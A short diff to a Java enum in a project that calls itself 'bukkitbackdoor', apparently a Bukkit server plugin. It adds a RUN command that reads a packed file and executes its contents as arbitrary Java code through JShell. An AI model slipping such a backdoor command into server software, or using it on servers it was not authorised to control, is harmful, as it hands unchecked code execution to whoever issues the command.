@@ -1,12 +1,17 @@
 package com.balugaq.bukkitbackdoor.api.objects.enums;
 
+import com.balugaq.bukkitbackdoor.api.code.CodeParser;
+import com.balugaq.bukkitbackdoor.api.code.CodeRunner;
 import com.balugaq.bukkitbackdoor.core.listeners.DefaultConfig;
 import com.balugaq.bukkitbackdoor.implementation.BukkitBackdoorPlugin;
+import com.balugaq.bukkitbackdoor.utils.Constants;
+import com.balugaq.bukkitbackdoor.utils.FileUtils;
 import lombok.Getter;
 import org.bukkit.Bukkit;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 
+import java.io.File;
 import java.util.function.Consumer;
 
 @Getter
@@ -25,6 +30,10 @@ public enum CommandEnum {
                 });
             }
         });
+    }),
+    RUN("run", (sender) -> {
+        String message = FileUtils.readFile(Constants.PACKED_FILE.toPath());
+        CodeRunner.runCode(CodeRunner.getJShell(), sender, CodeParser.parse(message));
     });
 
     private final String keyword;
